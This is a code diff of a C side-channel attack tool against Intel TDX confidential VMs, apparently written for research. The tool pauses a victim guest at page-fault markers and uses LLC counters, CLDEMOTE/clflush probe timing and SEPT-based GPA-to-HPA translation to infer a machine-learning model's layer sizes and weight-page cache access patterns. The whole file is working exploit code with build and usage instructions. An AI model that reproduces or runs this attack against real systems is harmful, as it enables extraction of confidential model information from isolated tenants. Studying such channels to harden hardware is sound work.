@@ -1,45 +1,24 @@
-// 2-cldemote-attack.c
+// 2-cldemote-attack.c  (Gen 1 — validated)
 //
-// Extended page-fault attack that adds a cldemote-based timing channel
-// on top of the existing LLC counter approach.
+// Extends the page-fault attack with a CLDEMOTE-based L3 contention
+// timing channel. At each START marker the attacker seats a 4 MB probe
+// buffer in L3 using CLDEMOTE and records a baseline read latency.
+// After the victim's layer runs, the probe buffer is re-read and the
+// latency delta reveals how much L3 pressure the layer generated,
+// which is proportional to its weight matrix size.
 //
-// ATTACK OVERVIEW
-// ---------------
-// The existing code (1-page-table-attack.c) blocks marker pages in the TD
-// and reads LLC counters between START/END marker pairs. That gives aggregate
-// cache traffic per layer but misses compute-bound layers that stay in L1/L2.
-//
-// This extension adds a Demote+Reload / DemoteContention inspired channel:
-//
-//   Before layer runs  (START marker fires):
-//     - Flush the probe buffer from all caches with clflush.
-//     - Then immediately demote the same lines back to L3 with cldemote
-//       (or skip the demote step if cldemote is unavailable — see below).
-//     - Record a baseline probe-access time (cold L3 read latency).
-//     - Resume the TD.
-//
-//   Victim executes the layer:
-//     - GEMM kernels generate L3 spills when weight matrices exceed L2.
-//     - Those spills create contention on the L3 cache sets/directory.
-//
-//   After layer completes (END marker fires):
-//     - Measure probe-buffer access latency again with rdtsc.
-//     - If the victim's layer caused significant L3 pressure, some of the
-//       attacker's probe lines will have been evicted from L3, making the
-//       reload slower than baseline.
-//     - The delta (post_cycles - baseline_cycles) is the contention signal.
-//
-// HARDWARE NOTE
-// -------------
-// cldemote (opcode 0F 1C /0) is only supported on Intel Xeon Sapphire Rapids
-// and Emerald Rapids. On Alder Lake / Raptor Lake it is treated as a NOP that
-// still performs a TLB lookup. If your CPU does not support cldemote, the code
-// falls back to clflush-only mode (HAVE_CLDEMOTE=0 at compile time), which
-// gives a cruder but still useful Flush+Reload signal.
+// LLC hardware counters are also read between each START/END pair as
+// a secondary signal.
 //
 // Build:
-//   With cldemote:    gcc -O2 -DHAVE_CLDEMOTE=1 -o attack 2-cldemote-attack.c
-//   Without cldemote: gcc -O2 -DHAVE_CLDEMOTE=0 -o attack 2-cldemote-attack.c
+//   With cldemote (Sapphire/Emerald Rapids):
+//     gcc -O2 -DHAVE_CLDEMOTE=1 -o attack 2-cldemote-attack.c -I../tdxutils/
+//   Without cldemote (fallback to clflush):
+//     gcc -O2 -DHAVE_CLDEMOTE=0 -o attack 2-cldemote-attack.c -I../tdxutils/
+//
+// Usage:
+//   sudo ./attack <model> <GPA1> <GPA2> ...
+//   Models: mlp, cnn, resnet, transformer
 
 #ifndef HAVE_CLDEMOTE
 #define HAVE_CLDEMOTE 0
@@ -58,6 +37,8 @@
 #include <time.h>
 #include <stdint.h>
 #include <string.h>
+#include <sys/mman.h>
+#include <sys/types.h>
 
 #define CRESET "\033[39m"
 #define CGRN   "\033[92m"
@@ -65,38 +46,40 @@
 #define CYEL   "\033[93m"
 
 // ---------------------------------------------------------------------------
-// Probe buffer parameters.
+// Probe buffer parameters
 //
-// We use a 4 MB probe buffer strided at cache-line granularity. This is large
-// enough to occupy a meaningful fraction of the L3 (typically 8-32 MB on
-// Xeon), so victim-induced evictions are detectable, but small enough that
-// iterating over it takes < 1 ms and does not itself disturb the measurement.
-//
-// PROBE_REPEATS: how many passes to make during the latency measurement.
-// More repeats = lower noise but longer measurement window.  Keep at 1 during
-// the layer window (we measure once right after END fires) — the victim is
-// paused at the marker so there is no race.
+// 4 MB at cache-line stride. Large enough to occupy ~18% of the 22.5 MB L3
+// so victim-induced evictions are detectable, small enough that one full
+// pass takes well under 1 ms.
 // ---------------------------------------------------------------------------
-#define PROBE_SIZE     (4 * 1024 * 1024)
-#define CACHE_LINE     64
-#define PROBE_STRIDE   CACHE_LINE
-#define PROBE_REPEATS  3
+#define PROBE_SIZE    (4 * 1024 * 1024)
+#define CACHE_LINE    64
+#define PROBE_STRIDE  CACHE_LINE
+#define PROBE_REPEATS 3
 
 static unsigned char *probe_buf;
 
 // ---------------------------------------------------------------------------
-// State for the START/END pairing logic.
+// State
 // ---------------------------------------------------------------------------
-static int    expected_end_idx = -1;
-static int    counter_active   = 0;
-static int    llc_refs_fd      = -1;
-static int    llc_misses_fd    = -1;
-
-// Baseline probe latency sampled right after flushing/demoting at START time,
-// before the TD is resumed.  The post-layer measurement is compared against
-// this so that we report a delta rather than an absolute cycle count (which
-// would vary with CPU frequency).
+static int      expected_end_idx      = -1;
+static int      counter_active        = 0;
+static int      llc_refs_fd           = -1;
+static int      llc_misses_fd         = -1;
 static uint64_t baseline_probe_cycles = 0;
+
+// ---------------------------------------------------------------------------
+// Gen 2: per-cache-line spatial bitmap state
+// ---------------------------------------------------------------------------
+#define PAGE_SIZE_4K     4096
+#define LINES_PER_PAGE   (PAGE_SIZE_4K / CACHE_LINE)   // 64
+#define L3_SETS          32768   // 22.5MB L3 / 64B line / 11 ways (approx)
+
+static int     current_offset  = 0;              // 0..63, which 64B line we probe
+static uint8_t bitmap[16][LINES_PER_PAGE];       // [layer][offset] -> 0/1/0xff
+static unsigned long last_weight_hpa = 0;        // HPA of victim weight page
+
+static unsigned long weight_page_gpa = 0;  // GPA of victim weight page passed via argv
 
 // ---------------------------------------------------------------------------
 // Low-level helpers
@@ -104,9 +87,6 @@ static uint64_t baseline_probe_cycles = 0;
 
 static inline uint64_t rdtsc(void) {
     unsigned int lo, hi;
-    // rdtscp serialises against prior loads/stores and writes the TSC into
-    // lo:hi. We use it (rather than rdtsc) so that out-of-order execution
-    // does not let the counter read retire before the probe loads above it.
     asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
     return ((uint64_t)hi << 32) | lo;
 }
@@ -119,29 +99,126 @@ static inline void lfence(void) {
     asm volatile("lfence" ::: "memory");
 }
 
-// Flush a single cache line from all cache levels (including L3).
 static inline void clflush_line(void *p) {
     asm volatile("clflush (%0)" :: "r"(p) : "memory");
 }
 
-// Demote a cache line from L1/L2 down to L3 without a full eviction.
-// On CPUs that do not support cldemote the instruction is a NOP but we still
-// emit it so the binary is identical — the compiler guards above handle the
-// fallback path at the higher level.
 #if HAVE_CLDEMOTE
+// CLDEMOTE: move a cache line from L1/L2 down to L3 without full eviction.
+// Opcode 0F 1C /0 — not yet in GCC built-ins, emit via .byte.
 static inline void cldemote_line(void *p) {
-    // CLDEMOTE r/m8 — opcode 0F 1C /0
-    // GCC does not have a built-in for this yet; emit via .byte.
     asm volatile(".byte 0x0f, 0x1c, 0x07" :: "D"(p) : "memory");
 }
 #else
-// On non-Sapphire-Rapids hardware fall back to clflush.  The effect is a
-// full eviction rather than a demotion to L3, giving a Flush+Reload signal
-// instead of Demote+Reload.  The contention delta is still meaningful.
+// Fallback: full eviction via clflush gives a coarser Flush+Reload signal.
 static inline void cldemote_line(void *p) {
     clflush_line(p);
 }
 #endif
+
+
+/*
+ * get_hpa_from_gpa - read the SEPT entry for a GPA and extract the HPA.
+ *
+ * Uses the existing seamcall_tdh_mem_sept_rd call. Returns 0 on failure.
+ * No kernel modification needed — this SEAMCALL is already available.
+ */
+static unsigned long get_hpa_from_gpa(int util_fd, unsigned long gpa,
+                                      unsigned long tdr_pa) {
+    union tdx_sept_entry entry;
+    unsigned long rc;
+
+    /* Try 2MB level first */
+    rc = seamcall_tdh_mem_sept_rd(util_fd, 1,
+                                  gpa & ~((1ul << 21) - 1),
+                                  tdr_pa, (void *)&entry, NULL);
+    if (rc == TDX_SUCCESS && entry.pfn)
+        return (unsigned long)entry.pfn << 12;
+
+    /* Fall back to 4KB level */
+    rc = seamcall_tdh_mem_sept_rd(util_fd, 0,
+                                  gpa & ~0xffful,
+                                  tdr_pa, (void *)&entry, NULL);
+    if (rc == TDX_SUCCESS && entry.pfn)
+        return (unsigned long)entry.pfn << 12;
+
+    return 0;
+}
+
+/*
+ * probe_line_for_set - find a line in our probe buffer that maps to the
+ * same L3 cache set as the given HPA.
+ *
+ * L3 set index = (PA >> 6) & (L3_SETS - 1)  [bits 6..20 for 32K sets]
+ * We scan our probe buffer for a line whose PA matches that set index.
+ * Since probe_buf is contiguous, we can compute the PA of each line as
+ * probe_buf_pa + i*CACHE_LINE where probe_buf_pa is the physical address
+ * of the start of the probe buffer (obtained once via /proc/self/pagemap).
+ */
+static unsigned long probe_buf_pa = 0;   /* physical address of probe_buf[0] */
+
+static void init_probe_buf_pa(void) {
+    int fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd < 0) { perror("open pagemap"); return; }
+
+    unsigned long vaddr  = (unsigned long)probe_buf;
+    unsigned long pfn_idx = vaddr / 4096;
+    uint64_t entry = 0;
+
+    if (lseek(fd, (off_t)(pfn_idx * 8), SEEK_SET) < 0 ||
+        read(fd, &entry, 8) != 8) {
+        perror("pagemap read");
+        close(fd);
+        return;
+    }
+    close(fd);
+
+    if (!(entry & (1ULL << 63))) {
+        fprintf(stderr, "probe_buf page not present in pagemap\n");
+        return;
+    }
+
+    probe_buf_pa = (unsigned long)((entry & ((1ULL << 55) - 1)) << 12)
+                   | (vaddr & 0xfff);
+    printf(CYEL "[gen2] probe_buf VA=0x%lx PA=0x%lx\n" CRESET,
+           vaddr, probe_buf_pa);
+}
+
+static void *get_probe_line_for_hpa(unsigned long hpa) {
+    if (!probe_buf_pa || !hpa) return NULL;
+
+    unsigned long target_set = (hpa >> 6) & (L3_SETS - 1);
+
+    for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
+        unsigned long line_pa  = probe_buf_pa + i;
+        unsigned long line_set = (line_pa >> 6) & (L3_SETS - 1);
+        if (line_set == target_set)
+            return &probe_buf[i];
+    }
+    return NULL;
+}
+
+static void print_bitmap(void) {
+    int layer, off;
+    printf(CYEL "\n=== Gen 2 Spatial Access Bitmap ===\n" CRESET);
+    printf("        ");
+    for (off = 0; off < LINES_PER_PAGE; off++) printf("%d", off % 10);
+    printf("\n");
+    for (layer = 0; layer < 16; layer++) {
+        int has = 0;
+        for (off = 0; off < LINES_PER_PAGE; off++)
+            if (bitmap[layer][off] != 0xff) { has = 1; break; }
+        if (!has) continue;
+        printf("layer%2d ", layer);
+        for (off = 0; off < LINES_PER_PAGE; off++) {
+            if      (bitmap[layer][off] == 0xff) printf(".");
+            else if (bitmap[layer][off] == 1)    printf("1");
+            else                                  printf("0");
+        }
+        printf("\n");
+    }
+    printf(CYEL "====================================\n" CRESET);
+}
 
 // ---------------------------------------------------------------------------
 // Probe buffer lifecycle
@@ -153,9 +230,9 @@ static void init_probe_buffer(void) {
         perror("aligned_alloc");
         exit(EXIT_FAILURE);
     }
-    // Write to every cache line so the pages are faulted in and resident.
     memset(probe_buf, 0xAB, PROBE_SIZE);
-    // Warm up: one full pass to bring everything into cache.
+
+    // Warm up: bring everything into cache.
     volatile unsigned long sum = 0;
     for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
         sum += probe_buf[i];
@@ -163,35 +240,36 @@ static void init_probe_buffer(void) {
     (void)sum;
 }
 
-// Step 1 of Demote+Reload: evict all probe lines from cache, then
-// immediately demote them back to L3 (or leave them evicted in fallback mode).
-// Called at START marker, before the TD is resumed.
+/*
+ * prepare_probe_buffer - called at each START marker before the TD resumes.
+ *
+ * Flushes every probe line from all cache levels, then (in CLDEMOTE mode)
+ * reads each line back and immediately demotes it to L3. After this call
+ * the entire probe buffer sits in L3 and nowhere else, giving a clean
+ * baseline for the contention measurement.
+ */
 static void prepare_probe_buffer(void) {
-    // First flush everything out.
     for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
         clflush_line(&probe_buf[i]);
     mfence_all();
 
 #if HAVE_CLDEMOTE
-    // Access each line to bring it back into L1, then immediately demote to
-    // L3.  This leaves probe lines in L3 (warm for L3, cold for L1/L2),
-    // mirroring the Demote+Reload setup: the next read will come from L3
-    // unless the victim evicted it.
     volatile unsigned long sum = 0;
     for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE) {
-        sum += probe_buf[i];                    // bring to L1
-        cldemote_line(&probe_buf[i]);           // push back to L3
+        sum += probe_buf[i];          // pull line into L1
+        cldemote_line(&probe_buf[i]); // push back to L3
     }
     mfence_all();
     (void)sum;
 #endif
-    // In fallback mode the lines are simply flushed; the victim's activity
-    // will determine how many remain absent when we probe after END.
 }
 
-// Step 2: measure how long it takes to read the entire probe buffer.
-// Lines that were evicted by the victim will incur L3 misses (or DRAM
-// accesses), inflating this number relative to the baseline.
+/*
+ * measure_probe_cycles - time a full sequential read of the probe buffer.
+ *
+ * Lines still in L3 will be fast. Lines evicted by the victim to DRAM will
+ * be slow. The difference (post − baseline) is the contention signal.
+ */
 static uint64_t measure_probe_cycles(void) {
     volatile unsigned long sum = 0;
     uint64_t start, end;
@@ -200,10 +278,9 @@ static uint64_t measure_probe_cycles(void) {
     mfence_all();
     start = rdtsc();
 
-    for (int r = 0; r < PROBE_REPEATS; r++) {
+    for (int r = 0; r < PROBE_REPEATS; r++)
         for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
             sum += probe_buf[i];
-    }
 
     mfence_all();
     end = rdtsc();
@@ -213,7 +290,7 @@ static uint64_t measure_probe_cycles(void) {
 }
 
 // ---------------------------------------------------------------------------
-// perf_event LLC counters (unchanged from original attack)
+// perf_event LLC counters
 // ---------------------------------------------------------------------------
 
 static long perf_event_open_counter(struct perf_event_attr *hw_event,
@@ -225,10 +302,10 @@ static long perf_event_open_counter(struct perf_event_attr *hw_event,
 static int open_llc_counter(uint64_t op, uint64_t result) {
     struct perf_event_attr pe;
     memset(&pe, 0, sizeof(struct perf_event_attr));
-    pe.type        = PERF_TYPE_HW_CACHE;
-    pe.size        = sizeof(struct perf_event_attr);
-    pe.config      = PERF_COUNT_HW_CACHE_LL | (op << 8) | (result << 16);
-    pe.disabled    = 1;
+    pe.type           = PERF_TYPE_HW_CACHE;
+    pe.size           = sizeof(struct perf_event_attr);
+    pe.config         = PERF_COUNT_HW_CACHE_LL | (op << 8) | (result << 16);
+    pe.disabled       = 1;
     pe.exclude_kernel = 0;
     pe.exclude_hv     = 0;
 
@@ -282,7 +359,7 @@ static unsigned long long now_ns(void) {
 }
 
 // ---------------------------------------------------------------------------
-// TDX / GPA helpers (unchanged)
+// TDX / GPA helpers
 // ---------------------------------------------------------------------------
 
 static unsigned char get_gpa_level(int util_fd, unsigned long gpa,
@@ -303,10 +380,10 @@ static int block_single_gpa(int util_fd, unsigned long gpa,
                              unsigned long tdr_pa) {
     unsigned char level = get_gpa_level(util_fd, gpa, tdr_pa);
     struct tdx_gpa_range range = {
-        .start   = level_align(gpa, level),
-        .end     = level_align(gpa, level) + level_pg_size(level),
-        .tdr_pa  = tdr_pa,
-        .level   = level,
+        .start  = level_align(gpa, level),
+        .end    = level_align(gpa, level) + level_pg_size(level),
+        .tdr_pa = tdr_pa,
+        .level  = level,
     };
     return ioctl(util_fd, IOCTL_TDX_BLOCK_GPA_RANGE, &range);
 }
@@ -316,7 +393,7 @@ static int same_2mb_page(unsigned long a, unsigned long b) {
 }
 
 // ---------------------------------------------------------------------------
-// Marker name tables (unchanged)
+// Marker name tables
 // ---------------------------------------------------------------------------
 
 static const char *marker_name(const char *model, int idx) {
@@ -379,19 +456,22 @@ static const char *marker_name(const char *model, int idx) {
 
 static int find_marker(unsigned long accessed, unsigned long *gpa,
                        int num_gpas) {
-    for (int i = 0; i < num_gpas; i++) {
+    for (int i = 0; i < num_gpas; i++)
         if (same_2mb_page(accessed, gpa[i]))
             return i;
-    }
     return -1;
 }
 
-static int is_start_marker(int idx) {
-    return idx == 1 || idx == 3 || idx == 5 || idx == 7;
+static int is_start_marker(int idx, const char *model) {
+    if (strcmp(model, "transformer") == 0)
+        return idx == 1 || idx == 3 || idx == 5 || idx == 7;
+    return idx == 1 || idx == 3 || idx == 5;
 }
 
-static int is_end_marker(int idx) {
-    return idx == 2 || idx == 4 || idx == 6 || idx == 8;
+static int is_end_marker(int idx, const char *model) {
+    if (strcmp(model, "transformer") == 0)
+        return idx == 2 || idx == 4 || idx == 6 || idx == 8;
+    return idx == 2 || idx == 4 || idx == 6;
 }
 
 static int matching_end_marker(int start_idx) {
@@ -413,31 +493,45 @@ int main(int argc, char *argv[]) {
     unsigned long tdr_pa;
     int util_fd, status;
 
-    if (argc < 3) {
+    if (argc < 4) {
         fprintf(stderr,
-            "Usage: %s <model> <GPA1> <GPA2> ...\n"
-            "Models: mlp, cnn, resnet, transformer\n",
+            "Usage: %s <model> <weight_GPA> <marker_GPA1> <marker_GPA2> ...\n"
+            "Models: mlp, cnn, resnet, transformer\n"
+            "weight_GPA: GPA of the victim weight matrix page to probe\n",
             argv[0]);
         exit(EXIT_SUCCESS);
     }
 
-    const char *model = argv[1];
-    int num_gpas = argc - 2;
+    const char *model    = argv[1];
 
+    // argv[2] = weight page GPA to probe for Gen 2
+    // argv[3..] = marker GPAs for page fault synchronization
+    char *endptr = NULL;
+    weight_page_gpa = strtoul(argv[2], &endptr, 0);
+    if (*endptr != '\0') {
+        fprintf(stderr, "Could not parse weight GPA '%s'\n", argv[2]);
+        exit(EXIT_FAILURE);
+    }
+    printf(CYEL "[gen2] probing weight page GPA 0x%lx\n" CRESET,
+           weight_page_gpa);
+
+    int num_gpas = argc - 3;
     unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
     if (!gpa) { perror("malloc"); exit(EXIT_FAILURE); }
 
     for (int i = 0; i < num_gpas; i++) {
-        char *endptr = NULL;
-        gpa[i] = strtoul(argv[i + 2], &endptr, 0);
+        endptr = NULL;
+        gpa[i] = strtoul(argv[i + 3], &endptr, 0);
         if (*endptr != '\0') {
-            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 2]);
+            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 3]);
             free(gpa);
             exit(EXIT_FAILURE);
         }
     }
 
     init_probe_buffer();
+    memset(bitmap, 0xff, sizeof(bitmap));
+    init_probe_buf_pa();
     init_perf_counters();
 
     util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
@@ -445,7 +539,7 @@ int main(int argc, char *argv[]) {
 
     tdr_pa = get_tdr_pa(util_fd);
 
-    // Drain any stale events.
+    // Drain any stale events from a previous run.
     while (read(util_fd, &address_accessed, sizeof(address_accessed)) > 0) {}
 
     for (int i = 0; i < num_gpas; i++) {
@@ -463,16 +557,12 @@ int main(int argc, char *argv[]) {
     start_ns = now_ns();
     last_ns  = start_ns;
 
-    // Column header — wider than original to fit new fields.
     printf("\n" CGRN
            "%-8s %-16s %-16s %-14s %-20s "
            "%-14s %-14s %-14s %-14s"
            CRESET "\n",
            "count", "time_ns", "delta_ns", "gpa", "marker",
-           "llc_refs", "llc_misses",
-           "baseline_cyc",   // probe latency measured at START (before victim runs)
-           "post_cyc"        // probe latency measured at END (after victim ran)
-           );
+           "llc_refs", "llc_misses", "baseline_cyc", "post_cyc");
 
     pfd = (struct pollfd){ .fd = util_fd, .events = POLLIN };
 
@@ -487,61 +577,100 @@ int main(int argc, char *argv[]) {
 
         current_ns = now_ns();
 
-        int idx        = find_marker(address_accessed, gpa, num_gpas);
+        int idx          = find_marker(address_accessed, gpa, num_gpas);
         const char *name = marker_name(model, idx);
 
         uint64_t llc_refs    = 0;
         uint64_t llc_misses  = 0;
         uint64_t post_cycles = 0;
 
-        if (is_start_marker(idx)) {
-            // ---------------------------------------------------------------
-            // START path: set up probe buffer, record baseline, then let LLC
-            // counters run while the victim executes the layer.
-            // ---------------------------------------------------------------
-
-            // 1. Prepare probe: flush from L1/L2, demote/re-seat to L3.
-            //    The victim's layer has not run yet, so this is our clean
-            //    baseline state.
+        if (is_start_marker(idx, model)) {
+            // Gen 1: seat probe buffer in L3, record baseline.
             prepare_probe_buffer();
-
-            // 2. Measure baseline probe latency (L3 hit latency in Demote
-            //    mode, or cold-miss latency in clflush fallback mode).
-            //    We do this before re-enabling the LLC counters so that our
-            //    own probe reads are excluded from the layer measurement.
             baseline_probe_cycles = measure_probe_cycles();
-
-            // 3. Now start LLC counters and record which END to expect.
             reset_start_counters();
             expected_end_idx = matching_end_marker(idx);
+
+            // Gen 2: get HPA of the faulting weight page and flush the
+            // probe buffer line that maps to the same L3 cache set.
+            // All done in userspace — no kernel changes needed.
+            last_weight_hpa = get_hpa_from_gpa(util_fd,
+                                               weight_page_gpa, tdr_pa);
+            if (last_weight_hpa) {
+                unsigned long target_hpa = last_weight_hpa
+                                         + (current_offset * CACHE_LINE);
+                void *probe_line = get_probe_line_for_hpa(target_hpa);
+                if (probe_line) {
+                    clflush_line(probe_line);
+                    mfence_all();
+                }
+            }
         }
 
-        if (is_end_marker(idx) && counter_active) {
-            // ---------------------------------------------------------------
-            // END path: the victim has just touched the END marker and is
-            // now paused (page fault).  Measure how the victim's layer
-            // affected our probe buffer's cache residency.
-            // ---------------------------------------------------------------
-
-            // 1. Stop LLC counters first so our probe reads are not counted.
+        if (is_end_marker(idx, model) && counter_active) {
+            // Gen 1: stop counters and re-measure probe buffer.
             stop_read_counters(&llc_refs, &llc_misses);
             counter_active   = 0;
             expected_end_idx = -1;
-
-            // 2. Measure post-layer probe latency.
-            //    In Demote+Reload mode: lines that were in L3 before the
-            //    victim ran will have been evicted if the victim caused
-            //    sufficient L3 set contention.  Those lines now require a
-            //    DRAM fetch, inflating post_cycles relative to baseline.
-            //    In clflush fallback mode: lines were absent from cache at
-            //    baseline too, so post_cycles measures whether the victim's
-            //    own activity happened to warm any of the same cache sets.
             post_cycles = measure_probe_cycles();
         }
 
-        // Print one row per marker event.  For START markers, post_cycles
-        // is 0 (it has not been measured yet).  For END markers,
-        // baseline_probe_cycles holds the value from the matching START.
+        if (is_end_marker(idx, model) && last_weight_hpa) {
+            // Gen 2: reload the same probe line we flushed at START.
+            // Time how long it takes — slow = victim warmed that cache
+            // set (HIT, bit=1), fast = victim never touched it (MISS, bit=0).
+            if (last_weight_hpa) {
+                unsigned long target_hpa = last_weight_hpa
+                                         + (current_offset * CACHE_LINE);
+                void *probe_line = get_probe_line_for_hpa(target_hpa);
+                if (probe_line) {
+                    int layer_idx = (idx / 2) - 1;
+                    uint64_t t1, t2, reload_delta;
+                    volatile unsigned char dummy;
+
+                    mfence_all();
+                    t1 = rdtsc();
+                    dummy = *(volatile unsigned char *)probe_line;
+                    mfence_all();
+                    t2 = rdtsc();
+                    reload_delta = t2 - t1;
+                    (void)dummy;
+
+                    // L3 hit ~150-300 cycles, L1/L2 hit ~10-50 cycles,
+                    // DRAM miss ~800+ cycles. Threshold at 400:
+                    // fast (<400) = line still cold = victim did NOT touch
+                    // this cache set = MISS = bit 0.
+                    // slow (>=400) = line was warmed by victim = HIT = bit 1.
+                    uint8_t bit = (reload_delta >= 400) ? 1 : 0;
+
+                    if (layer_idx >= 0 && layer_idx < 16)
+                        bitmap[layer_idx][current_offset] = bit;
+
+                    printf(CYEL
+                           "  [gen2] layer=%d offset=%d reload=%lu -> bit=%d\n"
+                           CRESET,
+                           layer_idx, current_offset,
+                           (unsigned long)reload_delta, bit);
+
+                    // Only advance offset on the LAST layer's END marker
+                    // so we probe one offset per complete inference run.
+                    // For MLP: L3_END is idx=6. For CNN: FC1_END is idx=6.
+                    // For ResNet/Transformer: CLASSIFIER_END is idx=6 or 8.
+                    // We advance when we see the last END before TERM.
+                    int last_end = (strcmp(model, "transformer") == 0) ? 8 : 6;
+                    if (idx == last_end) {
+                        current_offset = (current_offset + 1) % LINES_PER_PAGE;
+                        if (current_offset == 0) {
+                            print_bitmap();
+                            printf(CYEL
+                                   "[gen2] Full page scanned (%d inferences)."
+                                   " Restarting.\n" CRESET, LINES_PER_PAGE);
+                        }
+                    }
+                }
+            }
+        }
+
         printf(CGRN
                "%-8lu %-16llu %-16llu 0x%012lx %-20s "
                "%-14lu %-14lu %-14lu %-14lu"
@@ -572,6 +701,7 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }
 
+    print_bitmap();
     free(gpa);
     return 0;
 }
